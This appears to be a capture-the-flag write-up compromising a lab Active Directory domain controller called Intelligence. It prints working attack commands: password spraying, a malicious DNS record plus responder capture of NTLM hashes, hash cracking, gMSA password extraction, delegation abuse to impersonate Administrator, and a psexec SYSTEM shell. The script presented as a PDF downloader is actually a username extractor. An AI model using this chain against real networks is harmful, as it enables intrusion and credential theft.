
## CTF Writeup: Intelligence

---
## Reconnaissance

An initial scan revealed the following information about running services on the target server.

```
nmap -n -Pn -sSCV -p- -oN nmap.txt 10.129.95.154 
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 04:52 -0500
Nmap scan report for 10.129.95.154
Host is up (0.019s latency).
Not shown: 65517 filtered tcp ports (no-response)
PORT      STATE SERVICE           VERSION
53/tcp    open  domain            Simple DNS Plus
80/tcp    open  http              Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-title: Intelligence
88/tcp    open  kerberos-sec      Microsoft Windows Kerberos (server time: 2026-08-08 16:54:25Z)
135/tcp   open  msrpc             Microsoft Windows RPC
139/tcp   open  netbios-ssn       Microsoft Windows netbios-ssn
389/tcp   open  ldap              Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ldapssl?
3268/tcp  open  ldap              Microsoft Windows Active Directory LDAP (Domain: intelligence.htb, Site: Default-First-Site-Name)
3269/tcp  open  globalcatLDAPssl?
9389/tcp  open  mc-nmf            .NET Message Framing
49667/tcp open  msrpc             Microsoft Windows RPC
49693/tcp open  ncacn_http        Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc             Microsoft Windows RPC
49713/tcp open  msrpc             Microsoft Windows RPC
49728/tcp open  msrpc             Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
|_clock-skew: 6h59m58s
| smb2-time: 
|   date: 2026-08-08T16:55:15
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 216.39 seconds
```

The target seems to be an Domain Controller. The TCP Scan reveals information about the FQDN of the target, the Hostname & the name of the domain. Let's map them all to the target ip address in our local dns file.

```
echo "10.129.95.154 DC.intelligence.htb intelligence.htb DC" | tee -a /etc/hosts
```

Let's first check if anonymous & guest user access is enabled. For both were either access denied or the account itself was disabled.

```
nxc smb intelligence.htb -u 'guest' -p '' --shares
```

Let's proceed with enumerating the running http webserver. 

The webpage seems to be an non-finished webpage with one interesting "download" functionality. Upon pressing downloads we get forwarded to an .pdf file in /documents directory. The .PDF File is named "upload.pdf" which is rather interesting, is there an upload functionality somewhere?

Enumerated endpoints with feroxbuster, this didn't reveal any interesting endpoints.

```
feroxbuster --url http://intelligence.htb
```

Let's enumerate further endpoints with another wordlist. This didn't provide any proper results aswell.

```
feroxbuster -u http://intelligence.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

Enumerating subdomains also didn't provide any information.

```
ffuf -w /usr/share/wordlists/SecLists/Discovery/DNS/bitquark-subdomains-top100000.txt -u http://intelligence.htb -H "Host: FUZZ.intelligence.htb" -fs 7432
```

Since I couldn't find anything. I decided to download both .PDF Files onto my local machine to potentially retrieve information through metadata or even Steganography.

Checking the metadata of the Announcement PDF File reveals an username "William.Lee".

```
exiftool 2020-01-01-upload.pdf                                     
ExifTool Version Number         : 13.55
File Name                       : 2020-01-01-upload.pdf
Directory                       : .
File Size                       : 27 kB
File Modification Date/Time     : 2021:04:01 12:00:00-05:00
File Access Date/Time           : 2026:08:08 05:25:59-05:00
File Inode Change Date/Time     : 2026:08:08 05:25:59-05:00
File Permissions                : -rw-rw-r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Creator                         : William.Lee
```

The "other" .PDF File reveals another username called "Jose.Williams". Let's both add them to our username list and check with kerbrute if they are valid users on the Domain Controller. Success! Both of them are valid users.

```
kerbrute userenum --dc 10.129.95.154 -d intelligence.htb users.txt 

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 08/08/26 - Ronnie Flathers @ropnop

2026/08/08 05:31:18 >  Using KDC(s):
2026/08/08 05:31:18 >   10.129.95.154:88

2026/08/08 05:31:18 >  [+] VALID USERNAME:       William.Lee@intelligence.htb
2026/08/08 05:31:18 >  [+] VALID USERNAME:       Jose.Williams@intelligence.htb
2026/08/08 05:31:18 >  Done! Tested 2 usernames (2 valid) in 0.020 seconds
```

Tried spraying creds with the the password same as the username, but didn't work.

```
nxc smb intelligence.htb -u users.txt -p users.txt --shares
```

Since we are still stuck let's proceed with trying steganography.

Both of the .PDF Files don't seem to be encrypted with an password. I'm assuming we need to leverage smth else in order to get initial access. Let's proceed with ASREP-Roasting. 

This unfortunately didn't provide us any TGT.

```
impacket-GetNPUsers -dc-ip 10.129.95.154 intelligence.htb/ -no-pass -usersfile users.txt
```

Decided to enumerate file extensions on the website. But couldn't find a hit.

```
feroxbuster --url http://intelligence.htb -w /usr/share/dirb/wordlists/common.txt -x txt,php,html,zip,json,docx,aspx,asp,cgi,pdf
```

Started bruteforcing using nxc.

```
nxc smb intelligence.htb -u users.txt -p /usr/share/wordlists/SecLists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt --continue-on-success
```

Tried accessing rpc to enumerate domain, but access got denied as anonymous user.

```
rpcclient -U "" -N intelligence.htb
```

While the scan runs let's check LDAP as anonymous user. This didn't work unfortunately. We are lacking permissions.

```
ldapsearch -x -H ldap://intelligence.htb -b "dc=intelligence,dc=htb" > ldapsearch.txt
```

Performed an UDP Scan.

```
nmap -sU --top-ports 20 -oN nmap_udp.txt 10.129.95.154  
Starting Nmap 7.99 ( https://nmap.org ) at 2026-08-08 06:08 -0500
Nmap scan report for DC.intelligence.htb (10.129.95.154)
Host is up (0.018s latency).

PORT      STATE         SERVICE
53/udp    open          domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open          ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 1.77 seconds
```

I got stuck here now. So I had to look up. Those previously discovered .PDF Files shared an date in there name the way to get smth is by creating an script which potentially downloads other files with the same scheme. Let's create an script which downloads all files starting from 2000-01-01 and 2024-12-31, if there is an hit the script will use wget to download the .pdf file onto our local kali linux machine.

I created the script utilizing AI:

```
#!/bin/bash

PDF_DIR="."
OUTPUT_FILE="users2.txt"

# Check if directory exists
if [[ ! -d "$PDF_DIR" ]]; then
    echo "[!] Error: Directory $PDF_DIR not found."
    exit 1
fi

# Check if any PDFs present
shopt -s nullglob
pdfs=( "$PDF_DIR"/*.pdf )
if [[ ${#pdfs[@]} -eq 0 ]]; then
    echo "[!] No PDF files found in $PDF_DIR."
    exit 1
fi

echo "[*] Found ${#pdfs[@]} PDF files. Extracting usernames..."
echo "" > "$OUTPUT_FILE"

for pdf in "${pdfs[@]}"; do
    echo -n "   Processing: $(basename "$pdf") ... "

    # Try Author first, then Creator if Author empty
    author=$(exiftool -Author -s -s -s "$pdf" 2>/dev/null)
    if [[ -z "$author" ]]; then
        author=$(exiftool -Creator -s -s -s "$pdf" 2>/dev/null)
    fi

    if [[ -n "$author" ]]; then
        echo "Found: $author"
        echo "$author" >> "$OUTPUT_FILE"
    else
        echo "No username metadata found"
    fi
done

# Sort and deduplicate
sort -u -o "$OUTPUT_FILE" "$OUTPUT_FILE"
count=$(wc -l < "$OUTPUT_FILE")
echo ""
echo "[*] Done. $count unique username(s) saved to $OUTPUT_FILE"
```

Running the script took a while and I was able to download 99 .PDF File, which obviously was way more then I expected. Let's first create another script which runs exiftool on all of them and extracts the Username and saves it inside an users2.txt file.

Ran the script & gained an username wordlist.

```
bash user_enum.sh
```

We now have an strong users wordlist.

```
Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```

Tried kerberoasting with the new users wordlist, but didn't work.

```
impacket-GetNPUsers -dc-ip 10.129.95.154 intelligence.htb/ -no-pass -usersfile users.txt
```

Now I’ll search for a password for these users by looking in the PDF files. I’ll convert each PDF file to a TXT file so I can read it without having to open each PDF individually:

```
for pdf in $(ls); do pdftotext $pdf; done
```

Each PDF file now has a TXT version that I can display the contents of via my terminal. I’ll display the contents of each TXT file, grepping for the occurrence of ‘password’, displaying 2 lines before and 2 lines after:

```
cat *.txt | grep password -C3

New Account Guide
Welcome to Intelligence Corp!
Please login using your username and the default password of:
NewIntelligenceCorpUser9876
After logging in please change your password as soon as possible.
```

Sprayed users and found one valid hit.

```
nxc smb intelligence.htb -u users.txt -p passwords.txt --continue-on-success
```

```
Tiffany.Molina:NewIntelligenceCorpUser9876
```

Enumerated SMB Shares. There seems to be two non-default SMB Shares "Users" & "IT". Let's check them out.

```
nxc smb intelligence.htb -u Tiffany.Molina -p passwords.txt --shares
```

Connected to the Users Share and downloaded everything.

```
smbclient \\\\intelligence.htb/Users -U Tiffany.Molina
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> recurse On
smb: \> prompt OFF
smb: \> mget *
```

Retrieved user.txt in Users/Tiffany.Molina/Desktop.

```
a0bc333de90fd251868bd3533d25bed4
```

Connected to the other share and downloaded an interesting .ps1 script which revealed another user "Ted.Graves".

```
smbclient \\\\intelligence.htb/IT -U Tiffany.Molina
Password for [WORKGROUP\Tiffany.Molina]:
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr 18 19:50:55 2021
  ..                                  D        0  Sun Apr 18 19:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 19:50:55 2021

                3770367 blocks of size 4096. 1418639 blocks available
smb: \> get downdetector.ps1
```

Performed ASREP-Roasting again, but didn't work.

```
impacket-GetNPUsers -dc-ip 10.129.95.154 intelligence.htb/ -no-pass -usersfile users.txt
```

Tried performing Kerberoasting, but also didn't prove any results.

```
impacket-GetUserSPNs -request -dc-ip 10.129.95.154 intelligence.htb/Tiffany.Molina
```

Let's enumerate LDAP to potentially discover a new password.

```
ldapsearch -H "ldap://intelligence.htb" -D Tiffany.Molina@intelligence.htb -w 'NewIntelligenceCorpUser9876' -b "dc=intelligence,dc=htb" "*" > ldapsearch.txt
```

But this didn't show any information. 

Proceeded with downloading bloodhound information, so we can potentially find interesting ACL's which we can leverage.

```
bloodhound-python -u Tiffany.Molina -p 'NewIntelligenceCorpUser9876' -ns 10.129.95.154 -d intelligence.htb -c all
```

Started up my bloodhound instance on my local machine.

```
bloodhound-start
```

Uploaded domain information and marked my user as owned. But couldn't find any privesc. Had to look up again: The previously discovered .ps1 script crawls all "web" instances for dns entries. We could potentially add an malicious dns entry in order to 
intercept an ntlm hash.

1. Added dns entry
```
python3 /opt/arsenal/krbrelayx/dnstool.py -u 'intelligence\tiffany.molina' -p 'NewIntelligenceCorpUser9876' -r web2000.intelligence.htb -a add -t A -d 10.10.15.9 10.129.95.154
[-] Connecting to host...
[-] Binding to host
[+] Bind OK
[-] Adding new record
[+] LDAP operation completed successfully
```

2. Started up responder on my local machine.

```
responder -I tun0
```

After a couple of minutes I received the NTLM Hash of user Ted.Graves. Stored it inside an file and bruteforced with john the ripper.

```
john Ted.Graves --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)     
1g 0:00:00:06 DONE (2026-08-08 09:22) 0.1577g/s 1706Kp/s 1706Kc/s 1706KC/s Mrz.deltasigma..MondayMan7
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed.
```

Gained new credentials. 

```
Ted.Graves:Mr.Teddy
```

I marked this user as owned in BloodHound and found out that he has "ReadGMSAPassword" on the machine account SVC_INT$.

I will utilize this python script for this endavour. It will provide us with the NT Hash of the Machine Account.

```
git clone https://github.com/timothyericsson/gMSADumper-ng.git
```

Started up and activated virtual environment

```
python3 -m venv myenv
source myenv/bin/activate
```

Download requirements

```
pip install -r requirements.txt
```

Executed the script. But it error'd out due to clock skew error.

```
python3 gMSADumper-ng.py -u Ted.Graves -p 'Mr.Teddy' -d intelligence.htb
```

ntpdate & rdate didn't work either.

```
ntpdate -s intelligence.htb
rdate
```

Actually it wasn't an clock skew error, just simply the python script didn't work.

I utilized bloodyad to retrieve the NT Hash of the Machine Account.

```
bloodyad --host 10.129.46.115 -d intelligence.htb -u ted.graves -p 'Mr.Teddy' get object 'svc_int$' --attr msDS-ManagedPassword
```

Checked if Hash is valid & it is!

```
nxc smb intelligence.htb -u svc_int$ -H hashes.txt         
SMB         10.129.46.115   445    DC               [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.46.115   445    DC               [+] intelligence.htb\svc_int$:320520da1af1dc49e5bae1514f61f944
```

I marked the machine account as owned in BloodHound and found out he has AllowedToDelegate onto the Domain Controller! Let's abuse it.

```
unset KRB5CCNAME
impacket-getST -spn WWW/dc.intelligence.htb -impersonate Administrator -dc-ip 10.129.46.115 intelligence.htb/svc_int$ -hashes :320520da1af1dc49e5bae1514f61f944
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating Administrator
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

Exported .ccache ticket in local kerberos cache.

```
export KRB5CCNAME=$(pwd)/Administrator@WWW_dc.intelligence.htb@INTELLIGENCE.HTB.ccache
```

Connected to the Domain Controller using psexec & gained SYSTEM Shell.

```
impacket-psexec -k -no-pass dc.intelligence.htb
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on dc.intelligence.htb.....
[*] Found writable share ADMIN$
[*] Uploading file VZxMlOmN.exe
[*] Opening SVCManager on dc.intelligence.htb.....
[*] Creating service hgKj on dc.intelligence.htb.....
[*] Starting service hgKj.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.17763.1879]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>
```

Retrieved root.txt in C:\Users\Administrator\Desktop.

```
61142cce0f354dd002877ab55cf4d2ac
```